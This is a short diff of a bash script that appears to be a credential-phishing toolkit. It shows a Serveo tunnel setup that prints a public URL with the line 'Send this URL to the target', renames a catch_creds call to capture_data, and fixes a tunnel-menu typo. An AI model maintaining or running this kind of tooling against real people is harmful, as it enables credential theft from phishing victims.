@@ -432,7 +432,7 @@ echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing Serveo... ${BLUE}(SSH-ba
   SERVEO_URL=$(grep -o "https://[a-z0-9]*\.serveo\.net" .tunnels_log)
   echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} URL: ${SERVEO_URL}${WHITE}"
   echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Send this URL to the target.${WHITE}"
-  catch_creds
+  capture_data
 }
 
 ## Start localhost
@@ -465,7 +465,8 @@ tunnel_menu() {
 			start_cloudflared;;
 		3 | 03)
 			start_loclx;;
-                4 | 04) start serveo;;
+   
+                4 | 04) start_serveo;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
